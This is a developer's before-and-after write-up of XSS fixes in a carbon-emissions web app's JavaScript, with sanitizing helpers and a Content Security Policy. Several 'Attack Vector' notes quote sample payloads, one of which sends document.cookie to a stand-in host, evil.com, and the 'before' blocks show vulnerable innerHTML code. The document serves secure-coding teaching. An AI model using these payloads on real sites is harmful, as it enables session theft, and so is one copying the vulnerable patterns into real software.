# XSS Security Fixes - Code Examples

**Before and After Comparison**

This document shows the exact code changes made to fix XSS vulnerabilities.

---

## Fix 1: Breakdown Display (app.js Line 106)

### BEFORE (Vulnerable)
```javascript
function displayResults(data) {
    // Display breakdown
    const breakdownDiv = document.getElementById('breakdown');
    if (data.emissions.emissions_breakdown && data.emissions.emissions_breakdown.length > 0) {
        let breakdownHTML = '<h3>Emissions Breakdown</h3>';
        data.emissions.emissions_breakdown.forEach(item => {
            breakdownHTML += `
                <div class="breakdown-item">
                    <span>${item.source}</span>
                    <span>${item.co2e_tons.toFixed(3)} tons (${item.percentage}%)</span>
                </div>
            `;
        });
        breakdownDiv.innerHTML = breakdownHTML;  // ❌ XSS VULNERABILITY
    }
}
```

**Attack Vector:**
If `item.source` contains `<img src=x onerror=alert('XSS')>`, the malicious script executes.

### AFTER (Secure)
```javascript
function displayResults(data) {
    // Display breakdown - SECURE VERSION
    const breakdownDiv = document.getElementById('breakdown');

    // Clear existing content safely
    while (breakdownDiv.firstChild) {
        breakdownDiv.removeChild(breakdownDiv.firstChild);
    }

    if (data.emissions.emissions_breakdown && data.emissions.emissions_breakdown.length > 0) {
        // Create heading
        const heading = createSafeElement('h3', {}, 'Emissions Breakdown', false);
        breakdownDiv.appendChild(heading);

        // Create breakdown items
        data.emissions.emissions_breakdown.forEach(item => {
            const breakdownItem = createSafeElement('div', { class: 'breakdown-item' });

            // Sanitize item data
            const source = sanitizeString(item.source, { maxLength: 200 });
            const co2eTons = sanitizeNumber(item.co2e_tons, {
                min: 0,
                max: 1000000000,
                allowFloat: true
            });
            const percentage = sanitizeNumber(item.percentage, {
                min: 0,
                max: 100,
                allowFloat: true
            });

            // Create source span with textContent (safe)
            const sourceSpan = createSafeElement('span', {}, source, false);
            breakdownItem.appendChild(sourceSpan);

            // Create value span
            const valueText = `${co2eTons.toFixed(3)} tons (${percentage.toFixed(1)}%)`;
            const valueSpan = createSafeElement('span', {}, valueText, false);
            breakdownItem.appendChild(valueSpan);

            breakdownDiv.appendChild(breakdownItem);
        });
    }
}
```

**Protection:**
- `createSafeElement()` uses `textContent` instead of `innerHTML`
- All inputs validated with `sanitizeString()` and `sanitizeNumber()`
- No user-controlled data in HTML strings

---

## Fix 2: Report Display (app.js Line 140)

### BEFORE (Vulnerable)
```javascript
const reportDiv = document.getElementById('report');
if (data.report) {
    reportDiv.innerHTML = '<h3>Detailed Report</h3>' + data.report;  // ❌ XSS VULNERABILITY
}
```

**Attack Vector:**
If `data.report` from server contains `<script>steal_session()</script>`, it executes.

### AFTER (Secure)
```javascript
const reportDiv = document.getElementById('report');

// Clear existing content safely
while (reportDiv.firstChild) {
    reportDiv.removeChild(reportDiv.firstChild);
}

if (data.report) {
    const heading = createSafeElement('h3', {}, 'Detailed Report', false);
    reportDiv.appendChild(heading);

    // Sanitize HTML report content using DOMPurify
    const reportContainer = createSafeElement('div', { class: 'report-content' });
    safeSetHTML(reportContainer, data.report, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'h4', 'h5', 'ul', 'ol', 'li'],
        ALLOWED_ATTR: ['class'],
        ALLOW_DATA_ATTR: false
    });
    reportDiv.appendChild(reportContainer);
}
```

**Protection:**
- `safeSetHTML()` uses DOMPurify to sanitize HTML
- Whitelist of allowed tags (scripts blocked)
- No dangerous attributes allowed

---

## Fix 3: Agent List Display (app.js Line 153)

### BEFORE (Vulnerable)
```javascript
async function loadAgents() {
    try {
        const response = await fetch('/api/agents');
        const agents = await response.json();

        const agentsList = document.getElementById('agents-list');
        agentsList.innerHTML = agents.map(agent =>
            `<li><strong>${agent.name}</strong>: ${agent.description}</li>`
        ).join('');  // ❌ XSS VULNERABILITY
    } catch (error) {
        console.error('Error loading agents:', error);
    }
}
```

**Attack Vector:**
Malicious agent name: `<img src=x onerror=fetch('https://evil.com/?cookie='+document.cookie)>`

### AFTER (Secure)
```javascript
async function loadAgents() {
    try {
        const response = await fetch('/api/agents');
        const agents = await response.json();

        const agentsList = document.getElementById('agents-list');

        // Clear existing content safely
        while (agentsList.firstChild) {
            agentsList.removeChild(agentsList.firstChild);
        }

        if (Array.isArray(agents)) {
            agents.forEach(agent => {
                const listItem = createSafeElement('li', {});

                // Sanitize agent data
                const name = sanitizeString(agent.name, { maxLength: 200 });
                const description = sanitizeString(agent.description, { maxLength: 1000 });

                // Create strong element for name
                const nameStrong = createSafeElement('strong', {}, name, false);
                listItem.appendChild(nameStrong);

                // Add separator and description
                listItem.appendChild(document.createTextNode(': '));
                listItem.appendChild(document.createTextNode(description));

                agentsList.appendChild(listItem);
            });
        }
    } catch (error) {
        console.error('Error loading agents:', error);
    }
}
```

**Protection:**
- `createSafeElement()` with `textContent`
- `sanitizeString()` validates input length and format
- `document.createTextNode()` for plain text (always safe)

---

## Fix 4: Custom Fuel Row (app.js Line 171)

### BEFORE (Vulnerable)
```javascript
function addCustomFuel() {
    customFuelCount++;
    const customFuelsDiv = document.getElementById('custom-fuels');

    const fuelRow = document.createElement('div');
    fuelRow.className = 'custom-fuel-row';
    fuelRow.id = `custom-fuel-${customFuelCount}`;

    fuelRow.innerHTML = `
        <select class="fuel-type">
            <option value="diesel">Diesel</option>
            <option value="gasoline">Gasoline</option>
            <option value="propane">Propane</option>
            <option value="fuel_oil">Fuel Oil</option>
            <option value="coal">Coal</option>
        </select>
        <input type="number" class="fuel-consumption" placeholder="Amount" min="0" step="0.01">
        <select class="fuel-unit">
            <option value="gallons">Gallons</option>
            <option value="liters">Liters</option>
            <option value="kg">Kg</option>
            <option value="tons">Tons</option>
        </select>
        <button class="remove-fuel-btn" onclick="removeCustomFuel('custom-fuel-${customFuelCount}')">Remove</button>
    `;  // ❌ XSS VULNERABILITY (inline onclick handler)

    customFuelsDiv.appendChild(fuelRow);
}
```

**Issues:**
1. Inline `onclick` handler (blocked by CSP)
2. Template literal could be exploited if customFuelCount is manipulated

### AFTER (Secure)
```javascript
function addCustomFuel() {
    customFuelCount++;
    const customFuelsDiv = document.getElementById('custom-fuels');

    const fuelRow = createSafeElement('div', {
        class: 'custom-fuel-row',
        id: `custom-fuel-${customFuelCount}`
    });

    // Create select for fuel type
    const fuelTypeSelect = createSafeElement('select', { class: 'fuel-type' });
    const fuelTypes = [
        { value: 'diesel', label: 'Diesel' },
        { value: 'gasoline', label: 'Gasoline' },
        { value: 'propane', label: 'Propane' },
        { value: 'fuel_oil', label: 'Fuel Oil' },
        { value: 'coal', label: 'Coal' }
    ];
    fuelTypes.forEach(fuel => {
        const option = createSafeElement('option', { value: fuel.value }, fuel.label, false);
        fuelTypeSelect.appendChild(option);
    });
    fuelRow.appendChild(fuelTypeSelect);

    // Create input for consumption
    const consumptionInput = createSafeElement('input', {
        type: 'number',
        class: 'fuel-consumption',
        placeholder: 'Amount',
        min: '0',
        step: '0.01'
    });
    fuelRow.appendChild(consumptionInput);

    // Create select for unit
    const unitSelect = createSafeElement('select', { class: 'fuel-unit' });
    const units = [
        { value: 'gallons', label: 'Gallons' },
        { value: 'liters', label: 'Liters' },
        { value: 'kg', label: 'Kg' },
        { value: 'tons', label: 'Tons' }
    ];
    units.forEach(unit => {
        const option = createSafeElement('option', { value: unit.value }, unit.label, false);
        unitSelect.appendChild(option);
    });
    fuelRow.appendChild(unitSelect);

    // Create remove button with proper event listener (no inline onclick)
    const removeButton = createSafeElement('button', {
        class: 'remove-fuel-btn',
        type: 'button'
    }, 'Remove', false);

    // Store fuel ID for closure
    const fuelId = `custom-fuel-${customFuelCount}`;
    removeButton.addEventListener('click', function() {
        removeCustomFuel(fuelId);
    });
    fuelRow.appendChild(removeButton);

    customFuelsDiv.appendChild(fuelRow);
}
```

**Protection:**
- No `innerHTML` usage
- No inline event handlers
- `addEventListener()` instead of `onclick`
- All elements created programmatically

---

## Fix 5: Input Validation

### BEFORE (Vulnerable)
```javascript
async function calculateEmissions() {
    const electricity = parseFloat(document.getElementById('electricity').value) || 0;
    const gas = parseFloat(document.getElementById('gas').value) || 0;
    const buildingArea = parseFloat(document.getElementById('building-area').value) || 0;
    const buildingType = document.getElementById('building-type').value;
    // ❌ No validation, could be Infinity, NaN, negative numbers, malicious strings
}
```

### AFTER (Secure)
```javascript
async function calculateEmissions() {
    // Validate and sanitize all numeric inputs
    const electricity = sanitizeNumber(document.getElementById('electricity').value, {
        min: 0,
        max: 1000000,
        defaultValue: 0,
        allowFloat: true
    });

    const gas = sanitizeNumber(document.getElementById('gas').value, {
        min: 0,
        max: 1000000,
        defaultValue: 0,
        allowFloat: true
    });

    const buildingArea = sanitizeNumber(document.getElementById('building-area').value, {
        min: 0,
        max: 10000000,
        defaultValue: 0,
        allowFloat: true
    });

    // Validate building type (ensure it's from allowed list)
    const buildingTypeSelect = document.getElementById('building-type');
    const buildingType = sanitizeString(buildingTypeSelect.value, {
        maxLength: 50,
        allowedPattern: /^[a-z_]+$/,
        defaultValue: 'commercial_office'
    });

    // Validate custom fuels
    const allowedFuelTypes = ['diesel', 'gasoline', 'propane', 'fuel_oil', 'coal'];
    const allowedUnits = ['gallons', 'liters', 'kg', 'tons'];

    document.querySelectorAll('.custom-fuel-row').forEach(row => {
        const type = sanitizeString(typeSelect.value, {
            maxLength: 50,
            allowedPattern: /^[a-z_]+$/,
            defaultValue: 'diesel'
        });

        // Ensure fuel type is in allowed list
        if (!allowedFuelTypes.includes(type)) {
            console.warn(`Invalid fuel type: ${type}`);
            return;
        }

        const consumption = sanitizeNumber(consumptionInput.value, {
            min: 0,
            max: 1000000,
            defaultValue: 0,
            allowFloat: true
        });

        // ... similar validation for units
    });
}
```

**Protection:**
- All numbers validated with min/max/default
- Strings validated with patterns and length limits
- Whitelist validation for enum values
- Type checking before processing

---

## Fix 6: API Response Handling (api_docs.js)

### BEFORE (Vulnerable)
```javascript
async function tryEndpoint(endpoint) {
    const responseContainer = document.getElementById(`${endpoint}-response`);
    responseContainer.innerHTML = '<div>Loading...</div>';  // ❌ XSS VULNERABILITY

    try {
        // ... fetch code ...
        const data = await response.json();
        responseContainer.innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;  // ❌ XSS VULNERABILITY
    } catch (error) {
        responseContainer.innerHTML = `<div style="color: red;">Error: ${error.message}</div>`;  // ❌ XSS VULNERABILITY
    }
}
```

### AFTER (Secure)
```javascript
async function tryEndpoint(endpoint) {
    const responseContainer = document.getElementById(`${endpoint}-response`);

    // Clear existing content safely
    while (responseContainer.firstChild) {
        responseContainer.removeChild(responseContainer.firstChild);
    }

    // Show loading state
    const loadingDiv = createSafeElement('div', {}, 'Loading...', false);
    responseContainer.appendChild(loadingDiv);
    responseContainer.classList.add('show');

    // Validate endpoint name
    const allowedEndpoints = ['calculate', 'quick-calc', 'agents', 'fuel-types', 'regions', 'building-types'];
    const sanitizedEndpoint = sanitizeString(endpoint, {
        maxLength: 50,
        allowedPattern: /^[a-z-]+$/,
        defaultValue: 'agents'
    });

    if (!allowedEndpoints.includes(sanitizedEndpoint)) {
        safeSetText(responseContainer, 'Invalid endpoint');
        return;
    }

    try {
        // ... fetch code ...
        const data = await response.json();

        // Clear loading
        while (responseContainer.firstChild) {
            responseContainer.removeChild(responseContainer.firstChild);
        }

        // Display JSON response safely
        const jsonString = JSON.stringify(data, null, 2);
        const pre = createSafeElement('pre', {}, jsonString, false);
        responseContainer.appendChild(pre);

    } catch (error) {
        // Clear loading
        while (responseContainer.firstChild) {
            responseContainer.removeChild(responseContainer.firstChild);
        }

        // Show error
        const errorMsg = sanitizeString(error.message, { maxLength: 500 });
        const errorDiv = createSafeElement('div', {
            style: 'color: red;'
        }, `Error: ${errorMsg}`, false);
        responseContainer.appendChild(errorDiv);
    }
}
```

**Protection:**
- Endpoint validated against whitelist
- All text content set with `textContent`
- Error messages sanitized
- No user-controlled HTML strings

---

## Security Utilities

### escapeHTML()
```javascript
function escapeHTML(str) {
    if (typeof str !== 'string') {
        return '';
    }
    return str.replace(/[&<>"'/]/g, char => HTML_ENTITIES[char]);
}

// Example:
escapeHTML('<script>alert("XSS")</script>');
// Returns: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'
```

### sanitizeNumber()
```javascript
function sanitizeNumber(value, options = {}) {
    const {
        min = -Infinity,
        max = Infinity,
        defaultValue = 0,
        allowFloat = true
    } = options;

    const num = allowFloat ? parseFloat(value) : parseInt(value, 10);

    if (isNaN(num)) return defaultValue;
    if (num < min) return min;
    if (num > max) return max;
    return num;
}

// Example:
sanitizeNumber('abc', { defaultValue: 0 });  // Returns: 0
sanitizeNumber('999999', { max: 1000 });     // Returns: 1000
sanitizeNumber('-5', { min: 0 });            // Returns: 0
```

### sanitizeString()
```javascript
function sanitizeString(value, options = {}) {
    const {
        maxLength = 1000,
        allowedPattern = null,
        defaultValue = '',
        trim = true
    } = options;

    if (typeof value !== 'string') return defaultValue;

    let sanitized = trim ? value.trim() : value;

    if (sanitized.length > maxLength) {
        sanitized = sanitized.substring(0, maxLength);
    }

    if (allowedPattern && !allowedPattern.test(sanitized)) {
        return defaultValue;
    }

    return sanitized;
}

// Example:
sanitizeString('  hello  ', { trim: true });           // Returns: 'hello'
sanitizeString('x'.repeat(2000), { maxLength: 100 });  // Returns: 'xxx...' (100 chars)
sanitizeString('abc123', { allowedPattern: /^[a-z]+$/, defaultValue: '' });  // Returns: ''
```

### createSafeElement()
```javascript
function createSafeElement(tag, attributes = {}, content = '', isHTML = false) {
    const element = document.createElement(tag);

    // Set attributes safely
    for (const [key, value] of Object.entries(attributes)) {
        if (key.toLowerCase().startsWith('on')) {
            console.warn(`Blocked event handler attribute: ${key}`);
            continue;
        }

        if ((key === 'href' || key === 'src') && typeof value === 'string') {
            const lowercaseValue = value.toLowerCase().trim();
            if (lowercaseValue.startsWith('javascript:') || lowercaseValue.startsWith('data:text/html')) {
                console.warn(`Blocked dangerous URL in ${key}: ${value}`);
                continue;
            }
        }

        element.setAttribute(key, value);
    }

    // Set content safely
    if (content) {
        if (isHTML) {
            safeSetHTML(element, content);
        } else {
            safeSetText(element, content);
        }
    }

    return element;
}

// Example:
const div = createSafeElement('div', { class: 'item', id: 'item-1' }, 'Safe text', false);
const p = createSafeElement('p', {}, '<strong>Bold</strong>', true);  // HTML sanitized
```

---

## Content Security Policy

### Policy Definition
```python
# In csp_middleware.py
CSP_POLICY = (
    "default-src 'self'; "
    "script-src 'self' https://cdn.jsdelivr.net; "
    "style-src 'self' 'unsafe-inline'; "
    "img-src 'self' data: https:; "
    "font-src 'self' data:; "
    "connect-src 'self'; "
    "frame-ancestors 'none'; "
    "base-uri 'self'; "
    "form-action 'self'; "
    "object-src 'none'; "
    "upgrade-insecure-requests"
)
```

### What It Blocks
- ❌ Inline `<script>` tags
- ❌ `eval()` and similar code execution
- ❌ Scripts from untrusted domains
- ❌ Inline event handlers (`onclick`, `onerror`)
- ❌ `javascript:` URLs
- ❌ `data:` script URLs
- ❌ Framing by other sites
- ❌ Plugins (`<object>`, `<embed>`)

### What It Allows
- ✅ Scripts from same origin
- ✅ Scripts from cdn.jsdelivr.net (for DOMPurify)
- ✅ Inline styles (for compatibility)
- ✅ Images from any HTTPS source
- ✅ Fonts from same origin

---

## Summary

### Vulnerability Pattern
```javascript
// ❌ DANGEROUS PATTERN
element.innerHTML = userInput;
element.innerHTML = `<div>${userInput}</div>`;
element.innerHTML = serverResponse.html;
```

### Secure Pattern
```javascript
// ✅ SAFE PATTERN
safeSetText(element, userInput);
const div = createSafeElement('div', {}, userInput, false);
safeSetHTML(element, serverResponse.html, { ALLOWED_TAGS: ['p', 'strong'] });
```

### Golden Rules
1. **Never** use `innerHTML` with user-controlled data
2. **Always** validate inputs before processing
3. **Always** sanitize outputs before rendering
4. **Prefer** `textContent` over `innerHTML`
5. **Use** `createSafeElement()` for DOM creation
6. **Avoid** inline event handlers
7. **Implement** Content Security Policy
8. **Test** with XSS payloads

---

**All vulnerabilities have been fixed using these patterns!**

Files: C:\Users\aksha\Code-V1_GreenLang\
Date: 2025-11-21
